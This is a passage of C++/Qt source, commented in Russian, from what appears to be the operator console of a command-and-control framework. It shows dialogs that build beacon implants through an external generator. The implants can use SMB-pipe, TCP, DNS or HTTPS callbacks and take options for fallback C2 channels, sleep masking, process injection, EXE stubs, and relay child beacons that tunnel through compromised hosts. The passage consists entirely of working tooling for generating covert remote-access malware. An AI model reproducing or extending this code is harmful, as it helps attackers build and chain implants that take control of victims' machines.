        kindVal = "https";
    }
    hostVal     = host->text().trimmed();
    portVal     = port->text().trimmed();
    pipeVal     = pipe->text().trimmed();
    domainVal   = domainA->text().trimmed();
    parentIdVal = parentIdEdit->text().trimmed();
    QString osVal = osCb->currentData().toString();
    dlg->deleteLater();

    if (keyVal.isEmpty() || outVal.isEmpty()) {
        QMessageBox::warning(this, "Generate Artifact", "Listener key and Output file are required.");
        return;
    }
    QString dir = QApplication::applicationDirPath();
#ifdef _WIN32
    QString gen = dir + "/artifact-gen.exe";
#else
    QString gen = dir + "/artifact-gen";
#endif
    // artifact-gen сам найдёт шаблонный бинарник по --os / --arch / --type.
    QString inp = "auto";
    QStringList args;

    if (kindVal == "smb") {
        if (pipeVal.isEmpty()) pipeVal = "co2h";
        // host = целевая машина (куда beacon будет коннектиться через pipe).
        // uri_checkin = smb://<pipe_name> → transport.c выберет SMB-транспорт.
        args = {"--input", inp, "--key", keyVal,
                "--host", hostVal.isEmpty() ? "." : hostVal,
                "--uri-checkin", "smb://" + pipeVal,
                "--out", outVal};
    } else if (kindVal == "tcp") {
        if (hostVal.isEmpty()) hostVal = "127.0.0.1";
        if (portVal.isEmpty()) portVal = "4444";
        // uri_checkin = tcp:// → transport.c выберет TCP-транспорт.
        args = {"--input", inp, "--key", keyVal,
                "--host", hostVal, "--port", portVal,
                "--uri-checkin", "tcp://",
                "--out", outVal};
    } else if (kindVal == "dns") {
        if (domainVal.isEmpty()) {
            QMessageBox::warning(this, "Generate Artifact",
                "C2 domain is required for DNS artifacts.");
            return;
        }
        if (hostVal.isEmpty()) hostVal = defaultHost;
        // --host = IP teamserver'а (DNS резолвер-цель, UDP).
        // --uri-checkin dns://<domain> → transport.c выберет DNS-транспорт.
        // --port по умолчанию 53; если listener был на другом порту — берём из bind.
        QString dnsPort = "53";
        if (hasListeners) {
            const int idx2 = listenerCombo->currentIndex();
            if (idx2 >= 0 && idx2 < nL) {
                const auto* lr2 = listeners_model_->row(idx2);
                if (lr2 && lr2->kind == "dns") {
                    QStringList parts = lr2->bind.split(':');
                    if (parts.size() >= 2) dnsPort = parts[1].trimmed();
                }
            }
        }
        args = {"--input", inp, "--key", keyVal,
                "--host", hostVal, "--port", dnsPort,
                "--uri-checkin", "dns://" + domainVal,
                "--out", outVal};
    } else {
        // HTTPS — передаём URI/cookie/ua из профиля listener'а.
        if (hostVal.isEmpty()) hostVal = "127.0.0.1";
        if (portVal.isEmpty()) portVal = "443";
        args = {"--input", inp, "--key", keyVal,
                "--host", hostVal, "--port", portVal,
                "--out", outVal};
        // Поля профиля: если listener вернул их — прошиваем в beacon.
        // Иначе artifact-gen использует встроенные дефолты (/search, /api/feed, sid).
        if (hasListeners) {
            const QString uriC = lr->uri_checkin;
            const QString uriT = lr->uri_task;
            const QString uriP = lr->uri_post;
            const QString ck   = lr->cookie;
            const QString ua   = lr->user_agent;
            if (!uriC.isEmpty()) args << "--uri-checkin" << uriC;
            if (!uriT.isEmpty()) args << "--uri-task"    << uriT;
            if (!uriP.isEmpty()) args << "--uri-post"    << uriP;
            if (!ck.isEmpty())   args << "--cookie"      << ck;
            if (!ua.isEmpty())   args << "--ua"          << ua;
        }
    }
    // RSA-OAEP per-session key wrap. Все транспорты генерируют RSA-keypair
    // при создании листенера; добавляем --pubkey, если сервер вернул blob.
    if (!pubkeyVal.isEmpty()) {
        args << "--pubkey" << pubkeyVal;
    }
    if (!parentIdVal.isEmpty()) {
        args << "--parent-id" << parentIdVal;
    }
    // Fallback C2 channels
    {
        QString fbText = fallbackEdit->toPlainText().trimmed();
        if (!fbText.isEmpty()) {
            QStringList lines = fbText.split('\n', Qt::SkipEmptyParts);
            int fbCount = 0;
            for (const auto& line : lines) {
                QString l = line.trimmed();
                if (l.isEmpty()) continue;
                if (fbCount >= 4) break;
                args << "--fallback" << l;
                ++fbCount;
            }
        }
    }
    // Передаём целевую платформу — artifact-gen сам выберет шаблон (--input auto).
    args << "--os"   << osVal;     // windows | linux | macos
    args << "--arch" << archVal;   // x64, x86(32), arm64, arm32
    args << "--type" << fmtVal;   // exe|dll | elf|so | macho|dylib

    // Sleep mask (optional).
    QString maskVal = maskEdit->text().trimmed();
    if (!maskVal.isEmpty()) {
        args << "--mask" << maskVal;
    }

    // Process inject kit (optional).
    QString kitVal = kitEdit->text().trimmed();
    if (!kitVal.isEmpty()) {
        args << "--inject" << kitVal;
    }

    // Artifact-Kit EXE stub (optional). Если задан - бикон встраивается
    // в .co2pay секцию stub-EXE. Если пусто - артефакт пишется напрямую
    // (как было до появления опции).
    QString stubVal = stubEdit->text().trimmed();
    if (!stubVal.isEmpty()) {
        // Warn if stub architecture doesn't match beacon architecture.
        // x86 stub filename contains "x86", x64 stub contains "x64".
        QFileInfo stubInfo(stubVal);
        QString stubName = stubInfo.fileName().toLower();
        bool stubIs32 = stubName.contains("x86") || stubName.contains("32");
        bool stubIs64 = stubName.contains("x64") || stubName.contains("64");
        bool beaconIs32 = (archVal == "32");
        if ((beaconIs32 && stubIs64) || (!beaconIs32 && stubIs32)) {
            auto r = QMessageBox::warning(this, "Architecture mismatch",
                QString("Stub: %1\nBeacon: %2\n\n"
                        "Stub and beacon architectures appear to mismatch.\n"
                        "An x64 stub cannot load an x86 DLL and vice versa.\n\n"
                        "Continue anyway?")
                    .arg(stubIs32 ? "x86" : "x64")
                    .arg(beaconIs32 ? "x86" : "x64"),
                QMessageBox::Yes | QMessageBox::No, QMessageBox::No);
            if (r != QMessageBox::Yes) return;
        }
        args << "--stub" << stubVal;
    }

    tabs_->setCurrentIndex(tabs_->indexOf(graph_view_));

    auto* proc = new QProcess(this);
    proc->setWorkingDirectory(dir);
    connect(proc, &QProcess::readyReadStandardOutput, this, [this, proc]{
        appendLogsText(logs_, tabs_,
            QString::fromUtf8(proc->readAllStandardOutput()), QColor("#d7e3f4"));
    });
    connect(proc, &QProcess::readyReadStandardError, this, [this, proc]{
        appendLogsText(logs_, tabs_,
            QString::fromUtf8(proc->readAllStandardError()), QColor("#fb923c"));
    });
    connect(proc, qOverload<int, QProcess::ExitStatus>(&QProcess::finished), this,
            [this, proc, outVal, keyVal](int code, QProcess::ExitStatus) {
        if (code == 0) {
            appendLogsText(logs_, tabs_,
                QString("[artifact-gen] done → %1\n").arg(outVal), QColor("#10b981"));
        } else {
            appendLogsText(logs_, tabs_,
                QString("[artifact-gen] failed (code %1)\n").arg(code), QColor("#f87171"));
        }
        proc->deleteLater();
    });
    proc->start(gen, args);
    if (!proc->waitForStarted(3000)) {
        appendLogsText(logs_, tabs_,
            QString("[artifact-gen] failed to start: %1\n").arg(gen), QColor("#f87171"));
        proc->deleteLater();
    }
}

void MainWindow::onGenerateRelayChild(const QString& beaconId,
                                      const QString& internalIp,
                                      const QString& listenerName) {
    // Ищем listener_key по имени слушателя родительского бикона.
    QString keyVal, pubkeyVal;
    const int nL = listeners_model_->rowCount({});
    for (int i = 0; i < nL; ++i) {
        const auto* lr = listeners_model_->row(i);
        if (lr && lr->name == listenerName) {
            keyVal    = lr->key_hex;
            pubkeyVal = lr->pubkey_hex;
            break;
        }
    }
    if (keyVal.isEmpty()) {
        QMessageBox::warning(this, "Generate relay child beacon",
            QString("Listener key for '%1' not found.\n"
                    "Refresh the listeners list and try again.")
                .arg(listenerName));
        return;
    }

    auto* dlg = new QDialog(this);
    dlg->setWindowTitle("Generate relay child beacon");
    dlg->setMinimumWidth(430);

    // IP родителя — адрес, на который дочерний бикон будет коннектиться.
    auto* hostEdit = new QLineEdit(internalIp, dlg);
    // Порт relay-слушателя, который оператор открыл на родительском биконе.
    auto* portSpin = new QSpinBox(dlg);
    portSpin->setRange(1, 65535);
    portSpin->setValue(4447);

    // Выбор целевой ОС.
    auto* osCb = new QComboBox(dlg);
    osCb->addItem("Windows", QString("windows"));
    osCb->addItem("Linux",   QString("linux"));
    osCb->addItem("macOS",   QString("macos"));

    auto* fmtCombo = new QComboBox(dlg);
    fmtCombo->addItem("EXE", QString("exe"));
    fmtCombo->addItem("DLL", QString("dll"));

    auto* archCombo = new QComboBox(dlg);
    archCombo->addItem("x64", QString("64"));
    archCombo->addItem("x86", QString("32"));

    auto* lblFmt  = new QLabel("Format:", dlg);
    auto* lblArch = new QLabel("Architecture:", dlg);

    // Fallback C2 channels — до 4 резервных каналов.
    auto* fallbackEdit2 = new QPlainTextEdit(dlg);
    fallbackEdit2->setPlaceholderText("host:port[:uri]  (up to 4 channels, one per line)");
    fallbackEdit2->setMaximumHeight(80);

    auto* outEdit   = new QLineEdit(dlg);
    outEdit->setPlaceholderText("Select output file…");
    auto* browseBtn = new QPushButton("…", dlg);
    browseBtn->setFixedWidth(28);
    connect(browseBtn, &QPushButton::clicked, dlg, [outEdit, dlg, osCb, fmtCombo]{
        QString osVal  = osCb->currentData().toString();
        QString fmtVal = fmtCombo->currentData().toString();
        QString filter;
        if (osVal == "linux") {
            filter = (fmtVal == "so") ? "Shared library (*.so);;All (*)" : "ELF binary (*);;All (*)";
        } else if (osVal == "macos") {
            filter = (fmtVal == "dylib") ? "Dynamic library (*.dylib);;All (*)" : "Mach-O binary (*);;All (*)";
        } else {
            filter = (fmtVal == "dll") ? "DLL (*.dll);;All (*)" : "Executable (*.exe);;All (*)";
        }
        auto path = QFileDialog::getSaveFileName(dlg, "Output file", {}, filter);
        if (!path.isEmpty()) outEdit->setText(path);
    });
    connect(fmtCombo, &QComboBox::currentIndexChanged, dlg, [fmtCombo, outEdit]{
        QString cur = outEdit->text();
        if (cur.isEmpty()) return;
        QString ext = fmtCombo->currentData().toString();
        int dot = cur.lastIndexOf('.');
        if (dot > 0 && dot > cur.lastIndexOf('/') && dot > cur.lastIndexOf('\\'))
            cur = cur.left(dot + 1) + ext;
        outEdit->setText(cur);
    });

    // При смене ОС — обновить форматы и архитектуры.
    connect(osCb, QOverload<int>::of(&QComboBox::currentIndexChanged), dlg,
            [osCb, fmtCombo, archCombo, lblFmt](int) {
        QString os = osCb->currentData().toString();
        fmtCombo->clear();
        archCombo->clear();
        if (os == "linux") {
            fmtCombo->addItem("ELF", QString("elf"));
            fmtCombo->addItem("SO",  QString("so"));
            archCombo->addItem("x64",   QString("x64"));
            archCombo->addItem("ARM64", QString("arm64"));
            archCombo->addItem("ARM32", QString("arm32"));
        } else if (os == "macos") {
            fmtCombo->addItem("Mach-O", QString("macho"));
            fmtCombo->addItem("DYLIB",  QString("dylib"));
            archCombo->addItem("Universal (arm64 + x64)", QString("universal"));
            archCombo->addItem("ARM64 (Apple Silicon)",   QString("arm64"));
            archCombo->addItem("x64 (Intel)",             QString("x64"));
        } else {
            fmtCombo->addItem("EXE", QString("exe"));
            fmtCombo->addItem("DLL", QString("dll"));
            archCombo->addItem("x64", QString("64"));
            archCombo->addItem("x86", QString("32"));
        }
    });

    auto* form = new QFormLayout;
    form->addRow("Relay host (parent internal IP):", hostEdit);
    form->addRow("Relay port:", portSpin);
    form->addRow("Fallback C2:",  fallbackEdit2);
    form->addRow("Target OS:",   osCb);
    form->addRow(lblFmt,         fmtCombo);
    form->addRow(lblArch,        archCombo);

    auto* outRow = new QWidget(dlg);
    auto* outH   = new QHBoxLayout(outRow);
    outH->setContentsMargins(0, 0, 0, 0);
    outH->addWidget(outEdit);
    outH->addWidget(browseBtn);
    form->addRow("Output file:", outRow);

    // Информационная строка: транспорт, первые 8 символов ключа, ID родителя.
    auto* info = new QLabel(
        QString("Transport: TCP  •  Key: %1…  •  Parent: %2…")
            .arg(keyVal.left(8), beaconId.left(8)), dlg);
    info->setStyleSheet("color: #64748b; font-size: 11px;");

    auto* buttons = new QDialogButtonBox(
        QDialogButtonBox::Ok | QDialogButtonBox::Cancel, dlg);
    connect(buttons, &QDialogButtonBox::accepted, dlg, &QDialog::accept);
    connect(buttons, &QDialogButtonBox::rejected, dlg, &QDialog::reject);

    auto* v = new QVBoxLayout(dlg);
    v->addLayout(form);
    v->addWidget(info);
    v->addWidget(buttons);

    if (dlg->exec() != QDialog::Accepted) { dlg->deleteLater(); return; }

    QString hostVal = hostEdit->text().trimmed();
    QString portVal = QString::number(portSpin->value());
    QString fmtVal  = fmtCombo->currentData().toString();
    QString archVal = archCombo->currentData().toString();  // "64" или "32"
    QString osVal   = osCb->currentData().toString();
    QString outVal  = outEdit->text().trimmed();
    dlg->deleteLater();

    if (hostVal.isEmpty()) {
        QMessageBox::warning(this, "Generate relay child beacon",
            "Specify the IP address of the parent beacon host.\n"
            "(internal_ip is empty — rebuild the beacon and reconnect)");
        return;
    }
    if (outVal.isEmpty()) return;

    QString dir = QApplication::applicationDirPath();
#ifdef _WIN32
    QString gen = dir + "/artifact-gen.exe";
#else
    QString gen = dir + "/artifact-gen";
#endif
    // Дочерний бикон использует TCP-транспорт, коннектится к родителю,
    // а не к тимсерверу напрямую.
    // artifact-gen сам найдёт шаблон по --os / --arch / --type.
    QStringList args = {
        "--input",       "auto",
        "--key",         keyVal,
        "--host",        hostVal,
        "--port",        portVal,
        "--uri-checkin", "tcp://",
        "--parent-id",   beaconId,
        "--os",          osVal,
        "--arch",        archVal,
        "--type",        fmtVal,    // exe|dll (Windows) или elf|so (Linux)
        "--out",         outVal
    };
    if (!pubkeyVal.isEmpty())
        args << "--pubkey" << pubkeyVal;
    // Fallback C2 channels
    {
        QString fbText = fallbackEdit2->toPlainText().trimmed();
        if (!fbText.isEmpty()) {
            QStringList lines = fbText.split('\n', Qt::SkipEmptyParts);
            int fbCount = 0;
            for (const auto& line : lines) {
                QString l = line.trimmed();
                if (l.isEmpty()) continue;
                if (fbCount >= 4) break;
                args << "--fallback" << l;
                ++fbCount;
            }
        }
    }

    tabs_->setCurrentIndex(tabs_->indexOf(logs_)); // переходим на вкладку Logs

    auto* proc = new QProcess(this);
    proc->setWorkingDirectory(dir);
    connect(proc, &QProcess::readyReadStandardOutput, this, [this, proc]{
        appendLogsText(logs_, tabs_,
            QString::fromUtf8(proc->readAllStandardOutput()), QColor("#d7e3f4"));
    });
    connect(proc, &QProcess::readyReadStandardError, this, [this, proc]{
        appendLogsText(logs_, tabs_,
            QString::fromUtf8(proc->readAllStandardError()), QColor("#fb923c"));
    });
    connect(proc, qOverload<int, QProcess::ExitStatus>(&QProcess::finished), this,
            [this, proc, outVal](int code, QProcess::ExitStatus) {
        if (code == 0)
            appendLogsText(logs_, tabs_,
                QString("[artifact-gen] relay child → %1\n").arg(outVal),
                QColor("#10b981"));
        else
            appendLogsText(logs_, tabs_,
                QString("[artifact-gen] relay child failed (code %1)\n").arg(code),
                QColor("#f87171"));
        proc->deleteLater();
    });
    proc->start(gen, args);
    if (!proc->waitForStarted(3000)) {
        appendLogsText(logs_, tabs_,
            QString("[artifact-gen] failed to start: %1\n").arg(gen),
            QColor("#f87171"));
        proc->deleteLater();
    }
}

}
